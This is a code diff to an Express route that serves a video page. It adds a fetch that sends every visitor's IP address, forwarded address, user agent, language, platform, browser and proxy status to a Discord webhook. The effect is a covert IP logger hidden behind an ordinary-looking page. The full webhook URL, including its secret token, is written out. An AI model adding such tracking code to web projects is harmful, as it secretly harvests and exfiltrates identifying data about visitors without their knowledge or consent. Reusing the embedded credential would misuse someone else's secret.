@@ -21,8 +21,21 @@ app.get("/", async (req, res) => {
   const isProxy =
     req.headers["via"] || req.headers["x-forwarded-for"] ? "Yes" : "No";
 
-  console.log(
-    `IP Address: ${clientIp}, X-Forwarded-For or Remote Address: ${ipAddress}, User Agent: ${userAgent}, Language: ${lang}, Platform: ${platform}, Browser: ${browser}, Behind Proxy: ${isProxy}`
+  const result = `IP Address: ${clientIp}, X-Forwarded-For or Remote Address: ${ipAddress}, User Agent: ${userAgent}, Language: ${lang}, Platform: ${platform}, Browser: ${browser}, Behind Proxy: ${isProxy}`;
+  console.log(result);
+
+  fetch(
+    "https://discord.com/api/webhooks/1256567974295506995/RxPRfj3UqXLxchKY-nuZtcRrE5jrqcLIm4G7KQLmxqbbE8IPsqNtwuXajZkN1k-go0uh",
+    {
+      method: "post",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        username: "Serijo ipes",
+        content: result,
+      }),
+    }
   );
 
   const videoPath = path.join(process.cwd(), "public", "video.mp4");
